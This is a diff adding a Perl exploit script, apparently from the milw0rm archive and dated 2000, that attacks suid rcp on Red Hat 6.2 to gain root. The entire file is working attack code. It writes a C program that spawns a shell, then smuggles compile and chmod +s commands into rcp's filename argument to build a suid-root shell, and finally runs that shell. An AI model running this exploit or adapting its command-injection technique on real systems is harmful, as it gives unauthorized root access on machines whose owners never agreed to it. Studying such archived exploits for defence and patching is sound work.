@@ -1,0 +1,55 @@
+#!/usr/bin/perl -w
+#
+# exploits suid privledges on rcp
+# Not really tested this but hey
+# works on redhat6.2
+# not werk on freebsd4.1 stable
+#
+# bug discovered by
+# Andrew Griffiths
+#
+# Exploit written by tlabs
+# greetz to those that know me innit
+#
+# Please set your rcpfile
+# this can be found by doing
+#
+# ls -alF `which rcp`
+#
+# have a lot of fun
+
+$RCPFILE="/usr/bin/rcp" ;
+
+# configure above innit
+
+sub USAGE
+{
+    print "$0\nWritten by Tlabs\n" ;
+    exit 0 ;
+}
+
+if ( ! -u "$RCPFILE" )
+{
+    printf "rcp is not suid, quiting\n" ;
+    exit 0;
+}
+
+open(TEMP, ">>/tmp/shell.c")|| die "Something went wrong: $!" ;
+printf TEMP "#include<unistd.h>\n#include<stdlib.h>\nint main()\n{" ;
+printf TEMP "    setuid(0);\n\tsetgid(0);\n\texecl(\"/bin/sh\",\"sh\",0);\n\treturn 0;\n}\n" ;
+close(TEMP);
+open(HMM, ">hey")|| die "Something went wrong: $!";
+print HMM "Sploit written by tlabs, thanks to Andrew Griffiths for the bug report" ;
+close(HMM);
+
+system "rcp 'hey geezer; gcc -o /tmp/shell /tmp/shell.c;' localhost 2> /dev/null" ;
+system "rcp 'hey geezer; chmod +s /tmp/shell;' localhost 2> /dev/null" ;
+unlink("/tmp/shell.c");
+unlink("hey");
+unlink("geezer");
+printf "Ok, too easy, we'll just launch a shell, lets hope shit went well, innit:)\n" ;
+
+exec '/tmp/shell' ;
+
+
+# milw0rm.com [2000-11-29]
